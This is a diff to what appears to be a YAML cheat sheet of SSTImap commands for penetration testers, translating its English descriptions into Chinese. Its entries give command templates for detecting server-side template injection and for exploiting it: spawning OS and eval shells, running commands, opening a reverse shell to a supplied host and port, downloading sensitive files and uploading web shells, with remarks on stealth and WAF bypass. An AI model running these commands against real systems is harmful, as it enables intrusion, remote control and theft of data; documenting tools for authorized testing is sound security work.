@@ -4,99 +4,86 @@ tags: [security, pentest, exploitation, ssti, web, vulnerability-scanner, jinja2
 # === DISCOVERY AND SCANNING ===
 
 actions:
- - title: sstimap - basic url scan
+ - title: sstimap - 基础 URL 扫描
    desc: |
-     Perform an automated scan of a specific URL to detect Server-Side Template Injection (SSTI) vulnerabilities. 
-     The tool probes various parameters to identify the underlying template engine, such as Jinja2, Mako, or Twig. 
-     This is the most common entry point for testing web applications with dynamic content.
+     对特定 URL 执行自动化扫描，检测服务端模板注入（SSTI）漏洞。工具会探测多个参数以识别底层模板引擎，如 Jinja2、Mako 或 Twig。
+     这是测试具有动态内容的 Web 应用最常见的切入点。
    command: "sstimap.py -u {{url}}"
 
- - title: sstimap - scan post request data
+ - title: sstimap - 扫描 POST 请求数据
    desc: |
-     Scan for vulnerabilities within the body of a POST request. 
-     This is essential for testing forms, API endpoints, and search functionalities that do not use GET parameters. 
-     The data string should contain the parameters you wish to test for injection points.
+     扫描 POST 请求体中的漏洞。对于测试不使用 GET 参数的表单、API 端点和搜索功能至关重要。
+     data 字符串应包含你希望测试注入点的参数。
    command: "sstimap.py -u {{url}} --data {{post_data}}"
 
- - title: sstimap - scan with custom headers and cookies
+ - title: sstimap - 使用自定义请求头和 Cookie 扫描
    desc: |
-     Include specific HTTP headers or session cookies in the scanning process. 
-     Many web applications require authentication or specific headers like 'User-Agent' or 'Authorization' to access certain routes. 
-     Providing these allows sstimap to reach protected areas that might otherwise return 401 or 403 errors.
+     在扫描过程中包含特定的 HTTP 请求头或会话 Cookie。许多 Web 应用需要认证或特定请求头（如 User-Agent 或 Authorization）才能访问某些路由。
+     提供这些信息可使 sstimap 触达受保护区域，否则可能返回 401 或 403 错误。
    command: "sstimap.py -u {{url}} --headers {{headers}} --cookies {{cookies}}"
 
- - title: sstimap - increased detection level
+ - title: sstimap - 提高检测等级
    desc: |
-     Increase the depth of the scan using the level parameter to try more complex payloads. 
-     Higher levels increase the number of tests performed per parameter, which might find bypasses for basic filters. 
-     Note that higher levels (up to 5) will increase the scan duration and the number of requests sent to the server.
+     使用 level 参数提高扫描深度，尝试更复杂的 payload。更高级别会增加对每个参数的测试次数，可能发现绕过基础过滤器的方法。
+     注意更高级别（最高 5）会增加扫描时长和发往服务器的请求数量。
    command: "sstimap.py -u {{url}} --level {{level|2}}"
 
- - title: sstimap - use proxy for scanning
+ - title: sstimap - 使用代理扫描
    desc: |
-     Route all traffic through a specified proxy, such as Burp Suite or a SOCKS5 proxy. 
-     This is useful for debugging the payloads sent by sstimap or for hiding the origin IP address. 
-     It also allows for integration with other security tools in your testing pipeline.
+     将所有流量路由到指定代理，如 Burp Suite 或 SOCKS5 代理。这对于调试 sstimap 发送的 payload 或隐藏源 IP 很有用。
+     同时便于与测试流程中的其他安全工具集成。
    command: "sstimap.py -u {{url}} --proxy {{proxy_url|http://127.0.0.1:8080}}"
 
 # === EXPLOITATION - SHELL ACCESS ===
 
- - title: sstimap - get interactive os shell
+ - title: sstimap - 获取交互式 OS Shell
    desc: |
-     Spawn an interactive operating system shell on the target server once an injection point is confirmed. 
-     This allows for direct command execution and system navigation through the vulnerable template engine. 
-     This action carries a higher risk and should only be performed on authorized targets as it alters the server's state.
+     确认注入点后，在目标服务器上启动交互式操作系统 Shell。这允许通过易受攻击的模板引擎直接执行命令并浏览系统。
+     该操作风险较高且会改变服务器状态，只能对已授权的目标执行。
    command: "sstimap.py -u {{url}} --os-shell"
 
- - title: sstimap - execute single os command
+ - title: sstimap - 执行单条 OS 命令
    desc: |
-     Execute a single, specific operating system command on the remote target. 
-     The output of the command is returned directly to your terminal, making it ideal for quick reconnaissance. 
-     It is a stealthier alternative to spawning a full interactive shell when only specific information is needed.
+     在远程目标上执行单条特定操作系统命令。命令输出直接返回到终端，非常适合快速侦察。
+     当只需要特定信息时，这比启动完整交互式 Shell 更隐蔽。
    command: "sstimap.py -u {{url}} --os-cmd {{command|id}}"
 
- - title: sstimap - establish reverse shell
+ - title: sstimap - 建立反弹 Shell
    desc: |
-     Force the target server to initiate a connection back to your local machine. 
-     You must provide your local IP address and a port that you are listening on (e.g., via netcat). 
-     This technique is highly effective for bypassing restrictive inbound firewall rules on the target network.
+     迫使目标服务器向你的本机发起连接。你必须提供本地 IP 地址和正在监听的端口（例如通过 netcat）。
+     该技术在绕过目标网络限制性入站防火墙规则时非常有效。
    command: "sstimap.py -u {{url}} --reverse-shell {{lhost}} {{lport}}"
 
- - title: sstimap - engine evaluation shell
+ - title: sstimap - 引擎求值 Shell
    desc: |
-     Open an interactive shell that evaluates code directly in the template engine's base language (e.g., Python, PHP, Ruby). 
-     This is useful for inspecting the internal objects of the application or accessing environment variables. 
-     It provides a deeper level of interaction with the web application's runtime environment without executing OS commands.
+     打开一个交互式 Shell，直接在模板引擎的基础语言（如 Python、PHP、Ruby）中求值代码。这对于检查应用内部对象或访问环境变量很有用。
+     它无需执行 OS 命令即可与 Web 应用运行时环境进行更深层交互。
    command: "sstimap.py -u {{url}} --eval-shell"
 
 # === FILE OPERATIONS ===
 
- - title: sstimap - download remote file
+ - title: sstimap - 下载远程文件
    desc: |
-     Exfiltrate files from the target server's filesystem to your local machine. 
-     You can download sensitive configuration files, source code, or password files if the application user has sufficient permissions. 
-     Always ensure you have the correct absolute path of the file on the remote system.
+     将目标服务器文件系统中的文件提取到本机。如果应用用户权限足够，你可以下载敏感配置文件、源代码或密码文件。
+     始终确保提供远程系统上文件的正确绝对路径。
    command: "sstimap.py -u {{url}} --download {{remote_path}} {{local_path}}"
 
- - title: sstimap - upload local file
+ - title: sstimap - 上传本地文件
    desc: |
-     Upload a file from your local machine to the target server's filesystem. 
-     This is frequently used to deploy persistent web shells, scripts, or post-exploitation tools. 
-     Be careful with the remote path to avoid overwriting existing files and potentially breaking the application.
+     将本机文件上传到目标服务器的文件系统。常用于部署持久化 Web Shell、脚本或后渗透工具。
+     注意远程路径，避免覆盖现有文件并破坏应用。
    command: "sstimap.py -u {{url}} --upload {{local_path}} {{remote_path}}"
 
 # === ADVANCED TECHNIQUES ===
 
- - title: sstimap - manual engine selection
+ - title: sstimap - 手动指定引擎
    desc: |
-     Force the tool to use a specific template engine instead of performing automated detection. 
-     This speeds up the process if you already know the backend technology from previous reconnaissance. 
-     Supported engines include Jinja2, Mako, Tornado, Smarty, Freemarker, and many others.
+     强制工具使用特定模板引擎，而不是执行自动检测。如果你已通过前期侦察了解后端技术，这可以加快流程。
+     支持的引擎包括 Jinja2、Mako、Tornado、Smarty、Freemarker 等。
    command: "sstimap.py -u {{url}} --engine {{engine_name}}"
 
- - title: sstimap - technique selection
+ - title: sstimap - 选择利用技术
    desc: |
-     Specify the exploitation technique to be used during the attack. 
-     Options include 'render' (default), 'blind', or 'code' execution styles. 
-     Restricting techniques can help in environments where certain types of feedback are blocked by a Web Application Firewall (WAF).
+     指定攻击过程中使用的利用技术。选项包括 render（默认）、blind 或 code 等执行方式。
+     在 Web 应用防火墙（WAF）阻断某些反馈类型的环境中，限制技术会有帮助。
    command: "sstimap.py -u {{url}} --technique {{technique|render}}"
